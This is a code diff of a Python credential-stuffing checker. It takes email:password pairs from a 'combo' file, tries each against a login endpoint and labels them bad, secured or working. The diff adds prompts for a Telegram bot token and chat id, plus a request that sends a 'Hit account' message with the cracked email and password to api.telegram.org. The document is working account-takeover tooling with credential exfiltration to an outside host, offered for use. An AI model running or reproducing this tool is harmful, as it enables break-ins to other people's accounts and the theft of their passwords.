@@ -1,6 +1,7 @@
-print("ضع الاداة في مجلد Doucoments/Pydroid3/ مع الكومبو ")
 import requests
-combo_name = input("Input Combo file:")
+combo_name = input("Input Combo file : ")
+iD = input("EnTer iD : ")
+ToK = input("EnTer ToKeN : ")
 with open(combo_name, 'r') as f:
     accounts = f.readlines()
 for account in accounts:
@@ -44,13 +45,16 @@ for account in accounts:
 
     response = requests.post(url, headers=headers, data=data)
     if 'Type = {SQSA: 6, CSS: 5,' in response.text:
-    	print('bad login : [ '+email+':'+password+' ]')
-    	pass
+      print('bad login : [ '+email+':'+password+' ]')
+      pass
     elif 'name="ipt" id="ipt"' in response.text:
-    	print('secure login : [ '+email+':'+password+' ]')
+      print('secure login : [ '+email+':'+password+' ]')
     else:
-    	print( 'صحيح : [ '+email+':'+password+' ]')
-    	with open("ava_x.txt","w")as x:
-    	    x.write(email+":"+password)
-    	
-    	
+      print('Done : [ '+email+':'+password+' ]')
+text = f"""
+Hit account
+mail : [ {email} ]
+pass : [ {password} ]
+me? : @usaByte !"""
+
+requests.post(f"https://api.telegram.org/bot{ToK}/sendvideo?chat_id={iD}&video=https://t.me/ppy9y/4&caption="+str(text))
